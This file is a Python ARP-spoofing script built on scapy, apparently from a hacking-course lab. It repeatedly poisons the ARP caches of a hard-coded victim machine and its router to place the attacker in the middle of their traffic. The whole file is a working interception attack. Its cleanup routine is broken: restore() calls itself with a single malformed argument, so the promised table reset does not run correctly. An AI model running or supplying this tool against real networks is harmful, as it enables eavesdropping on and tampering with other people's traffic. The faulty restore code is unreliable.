#!/usr/bin/env python

import scapy.all as scapy
import time
import sys

# def get_mac(ip):
#     arp_request = scapy.ARP(pdst=ip)
#     broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
#     arp_request_broadcast = broadcast/arp_request
#     answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
#     return answered_list[0][1].hwsrc

def spoof(target_ip, spoof_ip):
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst="52:54:00:12:35:00", psrc=spoof_ip)
    scapy.send(packet, verbose=False)

def restore(destination_ip, source_ip):
    #source_mac = get_mac(destination_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst="52:54:00:12:35:00", psrc=source_ip, hwsrc="52:54:00:12:35:02")
    scapy.send(packet, count=4, verbose=False)

    restore("10.0.2.15, 10.0.2.1")

target_ip = "10.0.2.15" #IP of victim (windows machine)
gateway_ip = "10.0.2.1" #IP of router

try:
    packets_sent_count = 0  #counter variable for total packets sent
    while True: #Run "Man in the Middle" while loop
        spoof(target_ip, gateway_ip)  #tell victim we are router
        spoof(gateway_ip, target_ip)  #tell router we are victim
        packets_sent_count = packets_sent_count + 2 #Increment count by 2 every time while loop runs
        # \r overwrites the previous print so Packets sent are dynamically updated on same line
        print("\r[+] Packets sent: " + str(packets_sent_count)),
        sys.stdout.flush()
        time.sleep(1)
except KeyboardInterrupt:   #Exit while loop if user presses Ctrl + c
    print("\n[-] Detected CTRL + C ... Resetting ARP Tables ... Please wait.\n")    #User Feedback
    restore(target_ip, gateway_ip)  #give victim correct router IP
    restore(gateway_ip, target_ip)  #give router correct victim IP